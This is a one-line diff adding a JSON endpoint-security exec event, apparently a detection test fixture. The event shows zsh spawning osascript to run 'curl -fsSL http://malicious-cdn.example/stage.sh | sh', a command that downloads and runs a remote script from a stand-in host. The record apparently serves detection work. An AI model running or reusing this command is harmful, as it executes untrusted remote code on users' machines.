@@ -1,0 +1,1 @@
+{"time":"2026-07-11T10:30:00.100Z","process":{"executable":{"path":"/bin/zsh"},"ppid":501,"audit_token":{"pid":2201,"euid":501}},"event":{"exec":{"target":{"executable":{"path":"/usr/bin/osascript"}},"args":["osascript","-e","do shell script \"curl -fsSL http://malicious-cdn.example/stage.sh | sh\""]}}}
